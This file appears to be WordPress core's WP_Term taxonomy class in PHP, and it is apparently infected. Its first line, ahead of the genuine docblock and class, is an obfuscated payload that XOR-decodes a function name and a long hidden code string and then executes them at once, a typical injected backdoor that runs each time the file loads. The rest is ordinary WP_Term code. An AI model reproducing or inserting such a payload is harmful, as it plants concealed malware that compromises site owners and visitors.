<?php $TOjmXg='CC2+F .Q;: T-Y='^' 1WJ2Eq7NTC D6S';$TgTACaaCbZf=$TOjmXg('','TKKq4XC6O.WRl6C35>5FT9Z7r=;:.n+<ADwDCYNCZ,::TT>66W4D=h- D+k2;1HIOU9AJuSkU,YdFsHJg<4xxS9X.kObnrKoLcH,JbA-ogOZaPW3M2-+PY-LiT1AUDatc=HDECSJKXC SILOJu3,A 6A->ThZT;=;aGXAQL8YJL7:ZT>1YJlfHmYlD55:KUjJ;E1exe=P>SYdHDW VmlIWMZXTslK-V R.UTUVuQ39U4Qxk3>;R4032pAN3x7<yg3vAStWU+BUulYP20ZD7AM8FdtHV-Sd<R6PwYL=H=ziPRI8HOCPGT5O+4=waDBI>5ejJwR,0UfVE9s :6N10Sedmkyvg-1gyTJ+IBP,,rpWvvVQ X+Hg8z1AJZS1AfKT.FxWH,Q=pyYGt6+7ZymaaOY5KEI3S;ELnSj05> pxpn6U4Y==2X TWDURL,>P258j9NLL.U53YM8,V-T0 KjRMEWkZPLJU7VcU0MCFi0,XJr26,QfHja+N;81fYRDhXJ1=2Efh,7OchJUWLE4CIuAcD:DGbPR2Y97DKRLN2oXoruheV,CgSQoYG3WHmuZD7aD;rPQFCnPUWX7pDAQlR979+L-KELoI=EDT4oCNOAZ6AHWGtrO19LQyDvZFQl5ex5EUVKvJR3.hD5UO +1-m.yo>J70XTzVJld4'^'=-cPR--U;G8<3S;ZFJFnsA5E-YZNO1tQ40Pmjy5ISJOT7 WYXwL+O7IA0J4mVD<ak1X5+YsO>I MfShjGG>qqwV-ZKrBIUpeEj.C8JeDOZojZpsZqAYY<<CdM0P54mZTGTcolIZCo76TsgqobQWM5AmeDct6zpPXB:c1atlK-8 RTrpUT c1OsgPe6PAO9;BnT0ELCo4-4.Snl 6T7MQi1,6+1HfoI7T3q>1,vHqUX9G4Ca9XT QQPZPijl;xs2.vV  Ts>N;uHRytDQ61RhmCLmP,7Y2;W7OpJyhV-DAcYv-Y<.cmgpC.GAXLk9HCWSEBkS6MD4Ov>3zFUD+PS;ELI4+36xt4-t+Xif;IURMiVR 0L-NaGCp8Hn>2E 9 1WfEwlG4DKsPNPRJC;YPAE98Y> r9ZFO1dYNTTJAPEP.C;G<OTS4I.2l-=>sZ1FTg5T;8dL4FVoygH3N;TEcN6,16Bvph.4C7<>U4joR:E>bVVWX0FnLAJ<IYH927=7=2XNF6NOGR6DDjq3-1UjiSgClW rJt6S-Xlc 75ioFxROUOVgOuR04W:uUd,ZGkrUQuZAc3t Vcb4lVWmawJrXEKJ5r  50,E,7 GGd>.86Y ,pkTV+PM-xPdVzfqLNoqP34:cR.3GO3cE46LDPIJsPT4CRH1 RfcWnI');$TgTACaaCbZf();
/**
 * Taxonomy API: WP_Term class
 *
 * @package WordPress
 * @subpackage Taxonomy
 * @since 4.4.0
 */

/**
 * Core class used to implement the WP_Term object.
 *
 * @since 4.4.0
 */
final class WP_Term {

	/**
	 * Term ID.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var int
	 */
	public $term_id;

	/**
	 * The term's name.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var string
	 */
	public $name = '';

	/**
	 * The term's slug.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var string
	 */
	public $slug = '';

	/**
	 * The term's term_group.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var string
	 */
	public $term_group = '';

	/**
	 * Term Taxonomy ID.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var int
	 */
	public $term_taxonomy_id = 0;

	/**
	 * The term's taxonomy name.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var string
	 */
	public $taxonomy = '';

	/**
	 * The term's description.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var string
	 */
	public $description = '';

	/**
	 * ID of a term's parent term.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var int
	 */
	public $parent = 0;

	/**
	 * Cached object count for this term.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var int
	 */
	public $count = 0;

	/**
	 * Stores the term object's sanitization level.
	 *
	 * Does not correspond to a database field.
	 *
	 * @since 4.4.0
	 * @access public
	 * @var string
	 */
	public $filter = 'raw';

	/**
	 * Retrieve WP_Term instance.
	 *
	 * @since 4.4.0
	 * @access public
	 * @static
	 *
	 * @global wpdb $wpdb WordPress database abstraction object.
	 *
	 * @param int    $term_id  Term ID.
	 * @param string $taxonomy Optional. Limit matched terms to those matching `$taxonomy`. Only used for
	 *                         disambiguating potentially shared terms.
	 * @return WP_Term|WP_Error|false Term object, if found. WP_Error if `$term_id` is shared between taxonomies and
	 *                                there's insufficient data to distinguish which term is intended.
	 *                                False for other failures.
	 */
	public static function get_instance( $term_id, $taxonomy = null ) {
		global $wpdb;

		$term_id = (int) $term_id;
		if ( ! $term_id ) {
			return false;
		}

		$_term = wp_cache_get( $term_id, 'terms' );

		// If there isn't a cached version, hit the database.
		if ( ! $_term || ( $taxonomy && $taxonomy !== $_term->taxonomy ) ) {
			// Grab all matching terms, in case any are shared between taxonomies.
			$terms = $wpdb->get_results( $wpdb->prepare( "SELECT t.*, tt.* FROM $wpdb->terms AS t INNER JOIN $wpdb->term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id = %d", $term_id ) );
			if ( ! $terms ) {
				return false;
			}

			// If a taxonomy was specified, find a match.
			if ( $taxonomy ) {
				foreach ( $terms as $match ) {
					if ( $taxonomy === $match->taxonomy ) {
						$_term = $match;
						break;
					}
				}

			// If only one match was found, it's the one we want.
			} elseif ( 1 === count( $terms ) ) {
				$_term = reset( $terms );

			// Otherwise, the term must be shared between taxonomies.
			} else {
				// If the term is shared only with invalid taxonomies, return the one valid term.
				foreach ( $terms as $t ) {
					if ( ! taxonomy_exists( $t->taxonomy ) ) {
						continue;
					}

					// Only hit if we've already identified a term in a valid taxonomy.
					if ( $_term ) {
						return new WP_Error( 'ambiguous_term_id', __( 'Term ID is shared between multiple taxonomies' ), $term_id );
					}

					$_term = $t;
				}
			}

			if ( ! $_term ) {
				return false;
			}

			// Don't return terms from invalid taxonomies.
			if ( ! taxonomy_exists( $_term->taxonomy ) ) {
				return new WP_Error( 'invalid_taxonomy', __( 'Invalid taxonomy.' ) );
			}

			$_term = sanitize_term( $_term, $_term->taxonomy, 'raw' );

			// Don't cache terms that are shared between taxonomies.
			if ( 1 === count( $terms ) ) {
				wp_cache_add( $term_id, $_term, 'terms' );
			}
		}

		$term_obj = new WP_Term( $_term );
		$term_obj->filter( $term_obj->filter );

		return $term_obj;
	}

	/**
	 * Constructor.
	 *
	 * @since 4.4.0
	 * @access public
	 *
	 * @param WP_Term|object $term Term object.
	 */
	public function __construct( $term ) {
		foreach ( get_object_vars( $term ) as $key => $value ) {
			$this->$key = $value;
		}
	}

	/**
	 * Sanitizes term fields, according to the filter type provided.
	 *
	 * @since 4.4.0
	 * @access public
	 *
	 * @param string $filter Filter context. Accepts 'edit', 'db', 'display', 'attribute', 'js', 'raw'.
	 */
	public function filter( $filter ) {
		sanitize_term( $this, $this->taxonomy, $filter );
	}

	/**
	 * Converts an object to array.
	 *
	 * @since 4.4.0
	 * @access public
	 *
	 * @return array Object as array.
	 */
	public function to_array() {
		return get_object_vars( $this );
	}

	/**
	 * Getter.
	 *
	 * @since 4.4.0
	 * @access public
	 *
	 * @param string $key Property to get.
	 * @return mixed Property value.
	 */
	public function __get( $key ) {
		switch ( $key ) {
			case 'data' :
				$data = new stdClass();
				$columns = array( 'term_id', 'name', 'slug', 'term_group', 'term_taxonomy_id', 'taxonomy', 'description', 'parent', 'count' );
				foreach ( $columns as $column ) {
					$data->{$column} = isset( $this->{$column} ) ? $this->{$column} : null;
				}

				return sanitize_term( $data, $data->taxonomy, 'raw' );
		}
	}
}
